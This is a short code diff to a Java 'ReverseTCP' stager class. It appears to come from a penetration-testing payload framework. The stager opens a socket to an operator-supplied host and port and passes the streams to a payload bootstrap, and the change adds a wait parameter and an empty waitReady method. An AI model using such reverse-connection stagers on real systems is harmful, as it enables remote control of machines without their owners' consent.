@@ -38,8 +38,11 @@ import java.net.Socket;
 
 public class ReverseTCP extends Stager {
 
-	public void bootstrap(String[] parameters) throws Exception {
+	public void bootstrap(String[] parameters, boolean needWait) throws Exception {
 		final Socket s = new Socket(parameters[1], Integer.parseInt(parameters[2]));
 		bootstrap(s.getInputStream(), s.getOutputStream(), parameters);
+	}
+	
+	public void waitReady() throws InterruptedException {
 	}
 }
